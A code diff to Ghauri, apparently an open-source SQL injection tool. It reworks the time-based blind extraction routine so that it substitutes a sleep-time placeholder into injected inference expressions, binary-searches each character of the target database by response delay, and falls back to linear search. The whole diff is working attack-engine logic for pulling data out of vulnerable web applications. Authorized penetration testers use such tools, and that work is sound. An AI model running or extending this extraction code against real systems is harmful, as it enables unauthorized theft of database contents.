@@ -156,11 +156,11 @@ class GhauriExtractor:
         ascii_char = 0
         is_found = False
         character = ""
-        # logger.debug("performing a binary_search, for character..")
         http_firewall_code_counter = 0
         error_msg = None
         retry_on_error = 0
         logger.progress(f"retrieved: {chars}")
+        sleep_time = timesec
         while not is_found:
             if http_firewall_code_counter > 2:
                 message = f"{error_msg} - {http_firewall_code_counter} time(s)"
@@ -185,7 +185,6 @@ class GhauriExtractor:
                     break
                 if choice == "c":
                     retry_on_error = 0
-            sleep_time = timesec
             if delay > 0:
                 time.sleep(delay)
             ascii_char = int((minimum + maximum) / 2)
@@ -198,7 +197,9 @@ class GhauriExtractor:
                 query=queryable, position=offset, char=ascii_char
             )
             condition = replace_with(string=condition, character="=", replace_with=">")
-            expression = vector.replace("[INFERENCE]", f"{condition}")
+            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
+                "[SLEEPTIME]", f"{sleep_time}"
+            )
             logger.payload(f"{expression}")
             try:
                 attack = inject_expression(
@@ -312,6 +313,7 @@ class GhauriExtractor:
         http_firewall_code_counter = 0
         error_msg = None
         retry_on_error = 0
+        sleep_time = timesec
         while start < end:
             if http_firewall_code_counter > 2:
                 message = f"{error_msg} - {http_firewall_code_counter} time(s)"
@@ -339,7 +341,6 @@ class GhauriExtractor:
             ascii_char = list_of_chars[start]
             if delay > 0:
                 time.sleep(delay)
-            sleep_time = timesec
             logger.progress(f"retrieved: {chars}{ascii_char}")
             condition = expression_payload.format(
                 query=queryable, position=offset, char=ord(ascii_char)
@@ -374,7 +375,6 @@ class GhauriExtractor:
                 response_time = attack.response_time
                 if response_time >= sleep_time:
                     character += str(ascii_char)
-                    # logger.debug(f"retrieved character: '{str(character)}'")
                     break
             except KeyboardInterrupt as error:
                 logger.warning("user aborted during data extraction phase")
@@ -958,31 +958,62 @@ class GhauriExtractor:
                                     break
                             if vector_type == "time_vector":
                                 try:
-                                    retval = self._linear_search(
+                                    retval = self._binary_search(
                                         url=url,
                                         data=data,
                                         vector=vector,
                                         parameter=parameter,
                                         headers=headers,
+                                        base=base,
                                         injection_type=injection_type,
-                                        proxy=proxy,
-                                        is_multipart=is_multipart,
-                                        timeout=timeout,
                                         delay=delay,
                                         timesec=timesec,
+                                        timeout=timeout,
+                                        proxy=proxy,
+                                        is_multipart=is_multipart,
                                         suppress_output=suppress_output,
+                                        query_check=query_check,
+                                        minimum=32,
+                                        maximum=127,
+                                        offset=pos,
                                         expression_payload=value,
                                         queryable=entry,
                                         chars=chars,
-                                        offset=pos,
-                                        list_of_chars=list_of_chars,
+                                        vector_type=vector_type,
                                     )
-                                    chars += retval
+                                    if retval:
+                                        chars += retval
+                                    else:
+                                        logger.warning(
+                                            "ghauri was not able to guess character, switching algorithm.."
+                                        )
+                                        retval = self._linear_search(
+                                            url=url,
+                                            data=data,
+                                            vector=vector,
+                                            parameter=parameter,
+                                            headers=headers,
+                                            injection_type=injection_type,
+                                            proxy=proxy,
+                                            is_multipart=is_multipart,
+                                            timeout=timeout,
+                                            delay=delay,
+                                            timesec=timesec,
+                                            suppress_output=suppress_output,
+                                            expression_payload=value,
+                                            queryable=entry,
+                                            chars=chars,
+                                            offset=pos,
+                                            list_of_chars=list_of_chars,
+                                        )
+                                        chars += retval
                                     logger.debug(f"character(s) found: '{str(chars)}'")
                                 except KeyboardInterrupt:
                                     is_char_found = True
                                     is_extracted = True
                                     is_done_with_vector = True
+                                    if chars and len(chars) > 0:
+                                        logger.info(f"retrieved: '{chars}'")
                                     _temp = PayloadResponse(
                                         ok=False,
                                         error="user_ended",
